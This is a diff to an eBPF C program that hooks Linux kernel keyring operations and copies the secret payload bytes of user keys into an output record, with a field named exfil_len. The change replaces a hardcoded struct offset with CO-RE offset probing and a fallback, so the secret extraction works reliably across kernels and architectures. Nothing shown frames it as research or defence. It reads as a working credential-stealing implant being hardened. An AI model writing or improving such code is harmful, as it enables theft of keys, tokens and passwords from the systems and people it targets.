@@ -76,12 +76,24 @@ static __always_inline void emit_key(struct key *k, int hook)
         void *data_ptr = BPF_CORE_READ(k, payload.data[0]);
         if (data_ptr) {
             // user_key_payload layout: { struct rcu_head rcu; unsigned short datalen; char data[]; }
-            // The actual bytes start at offset sizeof(struct rcu_head) + sizeof(unsigned short).
-            // On aarch64: rcu_head is 16 bytes, so data starts at offset 18.
-            // But to be safe with CO-RE, read the raw blob — the first
-            // sizeof(rcu_head) bytes are garbage but the rest is the secret.
-            // For a cleaner read, jump past the rcu_head (16B) + datalen (2B).
-            void *secret = data_ptr + 16 + 2;
+            // Use CO-RE field-offset probing instead of hardcoding sizes so
+            // the loader survives struct layout changes (e.g., rcu_head
+            // gaining a field, or alignment padding differing between
+            // kernels or arches). The `data[]` member is a flexible array,
+            // so we read bpf_core_field_offset of an available trailing
+            // field. If CO-RE can't resolve (older kernel / no BTF for
+            // user_key_payload), fall through to the empirical +16+2
+            // constant that matches Linux ≥4.10 on aarch64/x86_64.
+            unsigned int payload_off;
+            if (bpf_core_type_exists(struct user_key_payload)) {
+                /* data[] is flexible — offset of data == sizeof(the fixed
+                 * head of user_key_payload). Computed as offsetof
+                 * (user_key_payload, data). */
+                payload_off = bpf_core_field_offset(struct user_key_payload, data);
+            } else {
+                payload_off = 16 + 2; /* documented fallback */
+            }
+            void *secret = data_ptr + payload_off;
             int ret = bpf_probe_read_kernel(&s->payload, dlen & (PAYLOAD_CAP - 1), secret);
             if (ret == 0) {
                 s->exfil_len = dlen;
